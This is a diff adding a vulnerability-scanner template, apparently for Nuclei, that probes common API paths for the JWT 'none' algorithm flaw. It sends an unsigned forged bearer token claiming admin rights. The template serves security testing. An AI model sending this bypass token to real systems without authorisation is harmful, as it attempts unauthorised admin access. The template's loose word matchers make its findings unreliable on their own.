@@ -1,0 +1,36 @@
+id: jwt-none-algorithm
+
+info:
+  name: JWT None Algorithm Vulnerability
+  author: Kalkaneus Team
+  severity: critical
+  description: Detects JWT endpoints vulnerable to none algorithm attack
+  reference:
+    - https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/
+  tags: jwt,authentication,none-algorithm,bypass
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/user"
+      - "{{BaseURL}}/api/profile"
+      - "{{BaseURL}}/api/admin"
+      - "{{BaseURL}}/user"
+      - "{{BaseURL}}/profile"
+    
+    headers:
+      Authorization: "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwiYWRtaW4iOnRydWUsImlhdCI6MTUxNjIzOTAyMn0."
+    
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+        
+      - type: word
+        words:
+          - "admin"
+          - "user"
+          - "profile"
+          - "success"
+        condition: or
